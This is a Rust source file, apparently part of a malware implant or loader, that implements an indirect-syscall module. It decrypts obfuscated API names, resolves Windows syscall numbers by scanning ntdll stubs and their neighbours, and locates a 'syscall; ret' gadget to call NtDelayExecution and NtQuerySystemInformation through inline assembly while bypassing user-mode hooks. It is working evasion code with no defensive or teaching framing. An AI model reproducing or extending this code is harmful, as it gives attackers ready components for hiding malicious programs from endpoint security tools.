use std::arch::asm;
use std::ffi::c_void;
use crate::{dynamo, dark_matter};

pub struct QuantumGate {
    ssn_delay: u16,
    ssn_query: u16,
    _ssn_alloc: u16,
    syscall_gadget: u64, 
}

impl QuantumGate {
    pub fn new() -> Option<Self> {
        unsafe {
            let ntdll_str = dark_matter::decrypt(dark_matter::NTDLL);
            
            let ssn_delay = Self::resolve_ssn(&ntdll_str, &dark_matter::decrypt(dark_matter::NT_DELAY))?;
            let ssn_query = Self::resolve_ssn(&ntdll_str, "NtQuerySystemInformation")?;
            let ssn_alloc = Self::resolve_ssn(&ntdll_str, "NtAllocateVirtualMemory")?;

            let func_addr = dynamo::Dynamo::get_func(&ntdll_str, &dark_matter::decrypt(dark_matter::NT_DELAY))?;
            let ptr = func_addr as *const u8;
            
            let mut syscall_gadget: u64 = 0;
            for i in 0..500 {
                let p = ptr.add(i);
                if *p == 0x0F && *p.add(1) == 0x05 && *p.add(2) == 0xC3 {
                    syscall_gadget = p as u64;
                    break;
                }
            }

            if syscall_gadget == 0 { return None; }
            
            Some(QuantumGate { 
                ssn_delay,
                ssn_query,
                _ssn_alloc: ssn_alloc,
                syscall_gadget
            })
        }
    }
    
    unsafe fn resolve_ssn(module: &str, func: &str) -> Option<u16> {
        let func_addr = dynamo::Dynamo::get_func(module, func)?;
        let ptr = func_addr as *const u8;
        
        if let Some(s) = Self::check_stub(ptr) {
            return Some(s);
        }
        
        for i in 1..50 {
            if let Some(s) = Self::check_stub(ptr.add(32 * i)) {
                return Some(s - (i as u16));
            }
            if let Some(s) = Self::check_stub(ptr.sub(32 * i)) {
                return Some(s + (i as u16));
            }
        }
        None
    }

    unsafe fn check_stub(ptr: *const u8) -> Option<u16> {
        if *ptr == 0x4C && *ptr.add(1) == 0x8B && *ptr.add(2) == 0xD1 && *ptr.add(3) == 0xB8 {
            let low = *ptr.add(4) as u16;
            let high = *ptr.add(5) as u16;
            return Some((high << 8) | low);
        }
        None
    }

    #[cfg(target_arch = "x86_64")]
    pub unsafe fn sleep(&self, ms: u32) {
        let intervals = (ms as i64) * -10_000;
        let p_intervals: *const i64 = &intervals;
        let ssn = self.ssn_delay as u32; 
        let gadget = self.syscall_gadget;
        let _status: u32;
        
        asm!(
            "mov r10, rcx",
            "mov eax, {0:e}",
            "call {1}",
            in(reg) ssn,
            in(reg) gadget,
            in("rcx") 0,          
            in("rdx") p_intervals,
            lateout("rax") _status,
            lateout("r10") _,
            lateout("r11") _,
        );
    }
    
    #[cfg(target_arch = "x86_64")]
    pub unsafe fn query_system_info(&self, info_class: u32, buf: *mut c_void, size: u32, ret_len: *mut u32) -> u32 {
        let ssn = self.ssn_query as u32;
        let gadget = self.syscall_gadget;
        let status: u32;
        
        asm!(
            "mov r10, rcx",
            "mov eax, {0:e}",
            "call {1}",
            in(reg) ssn,
            in(reg) gadget,
            in("rcx") info_class,
            in("rdx") buf,
            in("r8") size,
            in("r9") ret_len,
            lateout("rax") status,
            lateout("r10") _,
            lateout("r11") _,
        );
        status
    }

    #[allow(dead_code)]
    #[cfg(target_arch = "x86_64")]
    pub unsafe fn allocate_virtual_memory(&self, _process_handle: isize, _base_addr: *mut *mut c_void, _zero_bits: usize, _region_size: *mut usize, _alloc_type: u32, _protect: u32) -> u32 {
        // Placeholder to avoid unused variable warning and stable stack alignment issues
        let _ssn = self._ssn_alloc as u32;
        let _gadget = self.syscall_gadget;
        0 
    }

    #[cfg(not(target_arch = "x86_64"))]
    pub unsafe fn sleep(&self, _ms: u32) {}
    #[cfg(not(target_arch = "x86_64"))]
    pub unsafe fn query_system_info(&self, _c: u32, _b: *mut c_void, _s: u32, _r: *mut u32) -> u32 { 0 }
}

pub fn quantum_sleep(ms: u32) {
    if let Some(gate) = QuantumGate::new() {
        unsafe { gate.sleep(ms); }
    } else {
        std::thread::sleep(std::time::Duration::from_millis(ms as u64));
    }
}
